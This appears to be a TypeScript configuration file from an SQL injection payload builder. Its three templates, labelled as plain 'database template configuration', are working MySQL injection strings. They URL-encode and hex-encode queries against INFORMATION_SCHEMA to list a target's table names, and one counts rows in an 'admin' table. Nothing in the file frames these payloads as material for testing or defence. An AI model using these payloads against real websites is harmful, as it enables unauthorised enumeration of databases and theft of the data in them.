import { BuilderSubcategory, TemplateConfig } from '../../types';

export const tablesTemplates: TemplateConfig[] = [
  {
    id: 'tables-name-group-concat',
    name: 'TABLES_NAME group_concat()',
    description: 'Database template configuration',
    content: '(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE())', // MANUALLY INSERT TEMPLATE TEXT HERE
    parameters: [
      {
        id: 'database',
        label: 'Database',
        defaultValue: 'DATABASE()',
        inputType: 'text'
      }
    ]
  },
  {
    id: 'tables-name-one-shot',
    name: 'TABLES_NAME one shot()',
    description: 'One shot table template configuration',
    content: '(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)', // MANUALLY INSERT TEMPLATE TEXT HERE
    parameters: []
  },
  {
    id: 'table-name-count',
    name: 'TABLE NAME COUNT',
    description: 'Table count template configuration',
    content: 'concat(0x636f756e743a20, (Select count(0) from admin))', // MANUALLY INSERT TEMPLATE TEXT HERE
    parameters: []
  }
];

export const tablesSubcategory: BuilderSubcategory = {
  id: 'tables',
  label: 'Tables',
  description: 'Table template configuration and parameter definitions',
  templates: tablesTemplates
};
